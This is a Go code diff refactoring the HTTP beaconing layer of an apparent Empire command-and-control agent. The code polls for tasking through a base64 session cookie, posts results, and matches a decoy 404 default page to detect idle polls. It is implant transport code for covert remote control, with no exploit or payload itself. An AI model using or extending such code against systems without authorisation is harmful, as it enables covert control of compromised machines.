@@ -3,22 +3,24 @@ package comms
 import (
 	"bytes"
 	"encoding/base64"
-	"errors"
+	"fmt"
 	"io"
 	"math/rand"
 	"net/http"
-	"os"
-	"strconv"
 	"strings"
+	"time"
 )
 
-// legacyPostThresholdBytes is the size cutoff that picks GET vs POST for
-// an outgoing routing packet. It mirrors the server-side heuristic in the
-// malleable HTTP listener: small packets (session heartbeats / tasking
-// polls) go through the "get" section where the metadata terminator stuffs
-// them into a Cookie / header / query param; larger packets (sysinfo,
-// task results, file uploads) go through the "post" section's body.
-const legacyPostThresholdBytes = 20
+// RequestKind tells Send which half of the Empire HTTP contract a routing
+// packet belongs to. The packet itself is encrypted, so the caller must say.
+// Staging (stage 1 in dh.go, stage 2 in main.template) keeps its direct
+// http.Post calls and never goes through Send.
+type RequestKind int
+
+const (
+	RequestTasking RequestKind = iota // poll for tasking (meta 4): GET / malleable "get" section
+	RequestData                       // results (meta 5): POST / malleable "post" section
+)
 
 // HttpMessageSender owns the outbound HTTP path for the agent. In the plain
 // (non-malleable) build it only drives the legacy pipe-split path; when the
@@ -29,11 +31,11 @@ const legacyPostThresholdBytes = 20
 // pointer slot's worth of storage for them.
 type HttpMessageSender struct {
 	Headers         map[string]string
-	Profile         string
 	TaskURIs        []string
-	DefaultResponse string
 	Server          string
-	MissedCheckins  int
+	SessionCookie   string // cookie name carrying the routing packet on tasking GETs ("" = "session")
+	DefaultResponse []byte // the listener's default page: what it serves for an idle poll, accepted results and (http listener) a rejected packet
+	client          *http.Client
 
 	// Only populated when the `malleable` build tag is active — see
 	// http_malleable.go. Declared as interface{} here so this file compiles
@@ -41,10 +43,17 @@ type HttpMessageSender struct {
 	malleable interface{}
 }
 
-// NewHttpMessageSender builds a sender from the raw template variables. Only
-// drives the legacy pipe-split path; malleable builds use
-// NewMalleableHttpMessageSender (http_malleable.go) instead.
-func NewHttpMessageSender(server string, headers map[string]string, legacyProfile string) *HttpMessageSender {
+// requestTimeout bounds every request through Send, body included, so a hung
+// connection surfaces as a missed check-in instead of blocking the agent loop
+// forever. The cost: a tasking or result body that takes longer than this to
+// transfer is a miss (tasking) or silently lost (results).
+const requestTimeout = 120 * time.Second
+
+// NewHttpMessageSender builds a sender from the raw template variables.
+// defaultPage is the listener's decoded default response. Only drives the
+// legacy pipe-split path; malleable builds use NewMalleableHttpMessageSender
+// (http_malleable.go) instead.
+func NewHttpMessageSender(server string, headers map[string]string, legacyProfile, sessionCookie string, defaultPage []byte) *HttpMessageSender {
 	if strings.HasSuffix(server, "/") {
 		server = server[:len(server)-1]
 	}
@@ -58,82 +67,104 @@ func NewHttpMessageSender(server string, headers map[string]string, legacyProfil
 		taskURIs = strings.Split(parts[0], ",")
 	}
 
-	defaultResponse := "PCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBYSFRNTCAxLjAgU3RyaWN0Ly9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL3hodG1sMS9EVEQveGh0bWwxLXN0cmljdC5kdGQiPgo8aHRtbCB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94aHRtbCI+CjxoZWFkPgogICAgPG1ldGEgY29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PWlzby04ODU5LTEiIGh0dHAtZXF1aXY9IkNvbnRlbnQtVHlwZSIvPgogICAgPHRpdGxlPjQwNCAtIEZpbGUgb3IgZGlyZWN0b3J5IG5vdCBmb3VuZC48L3RpdGxlPgogICAgPHN0eWxlIHR5cGU9InRleHQvY3NzIj4KPCEtLQpib2R5e21hcmdpbjowO2ZvbnQtc2l6ZTouN2VtO2ZvbnQtZmFtaWx5OlZlcmRhbmEsIEFyaWFsLCBIZWx2ZXRpY2EsIHNhbnMtc2VyaWY7YmFja2dyb3VuZDojRUVFRUVFO30KZmllbGRzZXR7cGFkZGluZzowIDE1cHggMTBweCAxNXB4O30gCmgxe2ZvbnQtc2l6ZToyLjRlbTttYXJnaW46MDtjb2xvcjojRkZGO30KaDJ7Zm9udC1zaXplOjEuN2VtO21hcmdpbjowO2NvbG9yOiNDQzAwMDA7fSAKaDN7Zm9udC1zaXplOjEuMmVtO21hcmdpbjoxMHB4IDAgMCAwO2NvbG9yOiMwMDAwMDA7fSAKI2hlYWRlcnt3aWR0aDo5NiU7bWFyZ2luOjAgMCAwIDA7cGFkZGluZzo2cHggMiUgNnB4IDIlO2ZvbnQtZmFtaWx5OiJ0cmVidWNoZXQgTVMiLCBWZXJkYW5hLCBzYW5zLXNlcmlmO2NvbG9yOiNGRkY7CmJhY2tncm91bmQtY29sb3I6IzU1NTU1NTt9CiNjb250ZW50e21hcmdpbjowIDAgMCAyJTtwb3NpdGlvbjpyZWxhdGl2ZTt9Ci5jb250ZW50LWNvbnRhaW5lcntiYWNrZ3JvdW5kOiNGRkY7d2lkdGg6OTYlO21hcmdpbi10b3A6OHB4O3BhZGRpbmc6MTBweDtwb3NpdGlvbjpyZWxhdGl2ZTt9Ci0tPgogICAgPC9zdHlsZT4KPC9oZWFkPgo8Ym9keT4KPGRpdiBpZD0iaGVhZGVyIj48aDE+U2VydmVyIEVycm9yPC9oMT48L2Rpdj4KPGRpdiBpZD0iY29udGVudCI+CiAgICA8ZGl2IGNsYXNzPSJjb250ZW50LWNvbnRhaW5lciI+CiAgICAgICAgPGZpZWxkc2V0PgogICAgICAgICAgICA8aDI+NDA0IC0gRmlsZSBvciBkaXJlY3Rvcnkgbm90IGZvdW5kLjwvaDI+CiAgICAgICAgICAgIDxoMz5UaGUgcmVzb3VyY2UgeW91IGFyZSBsb29raW5nIGZvciBtaWdodCBoYXZlIGJlZW4gcmVtb3ZlZCwgaGFkIGl0cyBuYW1lIGNoYW5nZWQsIG9yIGlzIHRlbXBvcmFyaWx5CiAgICAgICAgICAgICAgICB1bmF2YWlsYWJsZS48L2gzPgogICAgICAgIDwvZmllbGRzZXQ+CiAgICA8L2Rpdj4KPC9kaXY+CjwvYm9keT4KPC9odG1sPg=="
-
 	return &HttpMessageSender{
 		Headers:         headers,
-		Profile:         legacyProfile,
 		TaskURIs:        taskURIs,
-		DefaultResponse: defaultResponse,
 		Server:          server,
-		MissedCheckins:  0,
+		SessionCookie:   sessionCookie,
+		DefaultResponse: defaultPage,
+		client:          &http.Client{Timeout: requestTimeout},
 	}
 }
 
-// SendMessage wires the outbound routing packet. When the `malleable` build
-// tag is set and a profile was attached, trySendMalleable (in
-// http_malleable.go) takes over; otherwise we fall through to the legacy
-// pipe-split cookie/body path.
-func (sender *HttpMessageSender) SendMessage(routingPacket []byte) ([]byte, error) {
-	if sender.Headers == nil {
-		sender.Headers = make(map[string]string)
+func (sender *HttpMessageSender) cookieName() string {
+	if sender.SessionCookie == "" {
+		return "session"
 	}
-	if handled, resp, err := sender.trySendMalleable(routingPacket); handled {
+	return sender.SessionCookie
+}
+
+// httpClient returns the sender's client. Constructor-built senders always
+// have one; the nil guard only serves struct literals in tests and is not
+// synchronised, so production code must not rely on it.
+func (sender *HttpMessageSender) httpClient() *http.Client {
+	if sender.client == nil {
+		sender.client = &http.Client{Timeout: requestTimeout}
+	}
+	return sender.client
+}
+
+// checkStatus maps a non-200 status onto Send's error contract.
+func checkStatus(code int) error {
+	switch {
+	case code == 200:
+		return nil
+	case code == 401:
+		return ErrSessionUnknown
+	default:
+		return fmt.Errorf("http %d", code)
+	}
+}
+
+// Send issues one request. It returns (nil, nil) when the server had nothing
+// for us: an idle poll, accepted results, or (http listener) a routing packet
+// it rejected and answered with its default page. 401 → ErrSessionUnknown;
+// other non-200 → "http <code>"; see poll.go for how polls are classified.
+func (sender *HttpMessageSender) Send(kind RequestKind, routingPacket []byte) ([]byte, error) {
+	if handled, resp, err := sender.trySendMalleable(kind, routingPacket); handled {
 		return resp, err
 	}
-	return sender.sendLegacy(routingPacket)
+	return sender.sendLegacy(kind, routingPacket)
 }
 
-// sendLegacy is the unchanged behavior from before the malleable refactor:
-// pick a random URI from the pipe-split list, POST payloads >20 bytes and
-// tuck smaller ones into a session= cookie on a GET.
-func (sender *HttpMessageSender) sendLegacy(routingPacket []byte) ([]byte, error) {
+// sendLegacy is the pipe-split-profile path: tasking requests GET a random
+// task URI with the routing packet in the session cookie; results POST it as
+// the body. This mirrors the Python/PowerShell agents.
+func (sender *HttpMessageSender) sendLegacy(kind RequestKind, routingPacket []byte) ([]byte, error) {
 	if len(sender.TaskURIs) == 0 {
-		return []byte{}, nil
+		return nil, ErrNoTaskURIs
 	}
-	taskURI := sender.TaskURIs[rand.Intn(len(sender.TaskURIs))]
-	requestURI := sender.Server + taskURI
+	requestURI := sender.Server + sender.TaskURIs[rand.Intn(len(sender.TaskURIs))]
 
 	var req *http.Request
 	var err error
-
-	if len(routingPacket) > legacyPostThresholdBytes {
-		req, err = http.NewRequest("POST", requestURI, bytes.NewReader(routingPacket))
-	} else {
-		b64RoutingPacket := base64.StdEncoding.EncodeToString(routingPacket)
-		sender.Headers["Cookie"] = "session=" + b64RoutingPacket
+	if kind == RequestTasking {
 		req, err = http.NewRequest("GET", requestURI, nil)
+	} else {
+		req, err = http.NewRequest("POST", requestURI, bytes.NewReader(routingPacket))
 	}
-
 	if err != nil {
-		sender.MissedCheckins++
-		return []byte{}, err
+		return nil, err
 	}
-
 	for k, v := range sender.Headers {
 		req.Header.Set(k, v)
 	}
+	if kind == RequestTasking {
+		// Per request, never stored in sender.Headers: a poll's cookie must
+		// not ride along on the next results POST.
+		req.Header.Set("Cookie", sender.cookieName()+"="+base64.StdEncoding.EncodeToString(routingPacket))
+	}
 
-	client := &http.Client{}
-	resp, err := client.Do(req)
+	resp, err := sender.httpClient().Do(req)
 	if err != nil {
-		sender.MissedCheckins++
 		return nil, err
 	}
 	defer resp.Body.Close()
-
 	body, err := io.ReadAll(resp.Body)
 	if err != nil {
-		sender.MissedCheckins++
 		return nil, err
 	}
-
-	if resp.StatusCode == 200 {
-		return body, nil
+	if err := checkStatus(resp.StatusCode); err != nil {
+		return nil, err
 	}
-	sender.MissedCheckins++
-	if resp.StatusCode == 401 {
-		os.Exit(0)
+	if len(body) == 0 {
+		// Never a valid answer from the http listener. Checked before the
+		// default-page compare: bytes.Equal(nil, empty) is true, so an empty
+		// DefaultResponse must not turn an empty body into "idle".
+		return nil, ErrEmptyResponse
 	}
-	return nil, errors.New(strconv.Itoa(resp.StatusCode))
+	if bytes.Equal(body, sender.DefaultResponse) {
+		return nil, nil // the http listener's "no tasking"
+	}
+	return body, nil
 }
